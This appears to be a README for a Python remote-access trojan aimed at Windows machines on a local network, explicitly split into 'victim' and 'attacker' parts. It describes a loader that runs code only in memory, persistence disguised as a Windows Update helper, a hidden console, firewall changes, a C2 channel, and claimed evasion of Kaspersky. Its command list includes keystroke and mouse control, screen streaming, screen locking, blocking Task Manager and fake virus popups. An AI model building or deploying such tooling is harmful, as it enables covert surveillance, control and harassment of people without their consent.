# LAN Remote Control Tool

A Python-based LAN remote control tool with stealth delivery via PowerShell loader.

## Files

| File | Description |
|------|-------------|
| `serveranydusk(local).py` | Server source — runs on victim machine |
| `webclient(local).py` | Client source — runs on attacker machine |
| `server.ps1` | PowerShell loader — launches server without .py on disk |
| `server.cmd` | Hidden launcher for server.ps1 |

## Requirements

### Victim (Server)

Python 3.12 with packages (auto-installed by loader if missing):

- `numpy`
- `opencv-python-headless`
- `pyautogui`
- `keyboard`
- `pynput`
- `psutil`
- `mss`

### Attacker (Client)

Python 3.x — no external dependencies (stdlib only).

## Usage

### Method 1: Direct Python

```bash
# On victim
python serveranydusk(local).py

# On attacker
python webclient(local).py
```

### Method 2: Stealth Loader (no .py on disk)

Copy `server.ps1` + `server.cmd` to victim, double-click `server.cmd`.

The loader:
1. Embeds server code as base64 inside `server.ps1`
2. Finds or downloads Python embeddable to `%LOCALAPPDATA%\Python312\wupsvc.exe`
3. Runs `wupsvc.exe -c "exec(base64.b64decode(os.environ['PYLOAD']))"`
4. Code lives only in memory — nothing on disk

## Server Commands

| Feature | Command |
|---------|---------|
| Remote desktop | Automatic on connect |
| Move mouse | `move <dx> <dy>` |
| Left/right click | `click left` / `click right` |
| Click at position | `click_at <x> <y>` |
| Type text | `type <text>` |
| Press key | `key <keyname>` |
| Special keys | `special_key ctrl/shift/alt/enter/esc/space/tab` |
| Open URL | `open <url>` |
| Reverse mouse | `reverse_mouse` |
| Auto move | `automove [speed]` |
| Auto click | `autoclick [interval] [duration]` |
| Lock screen | `lock_screen` |
| Unlock screen | `unlock` |
| Block Task Manager | `block_taskmgr` |
| Fake virus popup | `fake_virus` |
| Fake error popup | `fake_error` |
| Rick roll | `rick` |
| Shutdown | `shutdown` |
| Disconnect | `exit` |

## Stealth

- **Self-install** → `%LOCALAPPDATA%\Microsoft\Windows\Caches\WindowsUpdateHelper.exe` (hidden + system)
- **Autostart** → `HKCU\...\Run\WindowsUpdateHelper`
- **Process rename** → `python.exe` → `wupsvc.exe` (Task Manager shows "wupsvc")
- **Mutex** → `Global\WindowsUpdateSvc` (single instance)
- **Console hidden** → `ShowWindow(GetConsoleWindow(), 0)`
- **No .py on disk** → code in `$env:PYLOAD` base64, executed via `-c`
- **Firewall** → attempts `netsh` rule for TCP 65432 + UDP 45631

## Network

- **TCP** `0.0.0.0:65432` — C2 channel
- **UDP** `255.255.255.255:45631` — auto-discovery (server broadcasts `ip:65432` every 2s)
- **Screen** → mss capture → JPEG 40% → 4-byte length prefix + compressed data

## Anti-Detection

- **Kaspersky** detects compiled C loaders — PowerShell approach bypasses (no binary, just base64 in env var)
- `.py` files may be deleted by real-time protection — always keep `(local)` backup
- `wupsvc.exe` rename evades casual inspection

## Architecture

```
Attacker                          Victim
┌──────────────────┐             ┌──────────────────┐
│ webclient(local)  │◄───TCP────►│ server(local).py  │
│  stdin → cmds     │  65432     │  screen → stream  │
│  display ← screen │            │  cmds → action    │
└──────────────────┘             └──────────────────┘
                                        │
                                   UDP broadcast
                                   255.255.255.255:45631
                                        │
                                  Auto-discovery
```
